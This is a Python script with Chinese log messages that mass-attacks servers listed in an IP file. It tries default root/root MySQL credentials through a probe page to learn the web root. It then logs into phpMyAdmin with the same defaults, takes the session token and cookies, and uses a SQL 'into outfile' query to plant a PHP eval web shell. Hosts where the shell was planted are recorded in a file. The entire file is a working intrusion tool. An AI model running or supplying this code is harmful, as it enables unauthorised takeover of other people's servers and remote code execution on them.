import requests
import re
from bs4 import BeautifulSoup

def writeMySQLOKIp(ip):
    with open("mysql.txt", "a") as f:
        f.write(ip+"\n")

def writeShellIp(ip):
    with open("shell.txt", "a") as f:
        f.write(ip + "\n")

def MySQLConnectCheck(ip):
    global location
    data = {
        "host": "localhost", 
        "port": "3306", 
        "login": "root", 
        "password": "root", 
        "act": "MySQL 检测", 
        "funName": ""
    }
    action = "/l.php"
    try:
        formAction = ip + action
        response = requests.post(formAction, data = data, timeout = 5)
        if response.ok:
            print(ip, "访问成功")
            body = response.text
            htmlBody = BeautifulSoup(body, "html.parser")
            if htmlBody.select("script")[0].string.find("正常") != -1:
                print(ip, "数据库连接成功")
                trs = htmlBody.select("table")[0].select("tr")
                location = trs[-2].select("td")[-1].string
                writeMySQLOKIp(ip)
                PhpMyAdminCheck(ip)
            else:
                print(ip, "数据库连接失败")
        else:
            print(ip, "访问失败")
    except BaseException as e:
        print(ip, "访问错误")
        PhpMyAdminCheck(ip)

def PhpMyAdminCheck(ip):
    phpMyAdminURL = ip + "/phpmyadmin"
    try:
        response = requests.get(phpMyAdminURL, timeout=5)
        if response.ok:
            print(ip, "phpmyadmin 连接成功")
            LoginPhpMyAdmin(phpMyAdminURL)
        else:
            print(ip, "phpmyadmin 连接失败")
    except BaseException as e:
        print(ip, "error")

def LoginPhpMyAdmin(phpMyAdminURL):
    try: 
        data = {"pma_username": "root", "pma_password": "root", "server": "1", "lang": "en"}
        response = requests.post(phpMyAdminURL+"/index.php", data=data, timeout=5)
        # 得 Token
        pat = re.compile(r"var token ='(\S*)'")
        token = re.findall(pat, response.text)[0]

        # 得 Cookie
        setCookie = response.history[0].headers["set-cookie"]
        pattern = re.compile(r"p[\w-]*=[\w%]*;")
        cookies = ' '.join(re.findall(pattern, setCookie))
        print(phpMyAdminURL, "phpMyAdmin 登陆成功")
        ExecuteSQL(cookies, phpMyAdminURL, token)
    except BaseException as e:
        print(phpMyAdminURL, "phpMyAdmin 登陆失败")

def ExecuteSQL(cookies, phpMyAdminURL, token):
    global location
    try:
        sql = "select'<?php @eval($_POST[setting])?>'into outfile'" + location + "/setting.php'"
        data = {
            "is_js_confirmed":"0",
            "db": "mysql",
            "token": token,
            "pos": "0",
            "prev_sql_query": "",
            "goto": "db_sql.php",
            "message_to_show": "123",
            "sql_query": sql,
            "sql_delimiter": ";",
            "show_query": "1",
            "ajax_request": "true"
        }
        headers = {"Cookie": cookies}
        response = requests.post(phpMyAdminURL+"/import.php", data=data, headers=headers, timeout=3).json()
        if response["success"]:
            print(phpMyAdminURL+"/setting.php", "webshell 植入成功, pwd:setting");
            writeShellIp(phpMyAdminURL+"/setting.php")
        else:
            print(phpMyAdminURL, "webshell 植入失败, reason:", response["error"]);
    except BaseException as e:
        print(phpMyAdminURL, "error")
    
def main():
    with open("ip.txt", "r") as f:
        for line in f:
            ip = line.strip("\n")
            target = "http://" + ip
            try:
                MySQLConnectCheck(target)
            except BaseException as e:
                print(e)
                continue

location = ""
if __name__ == "__main__":
    main()

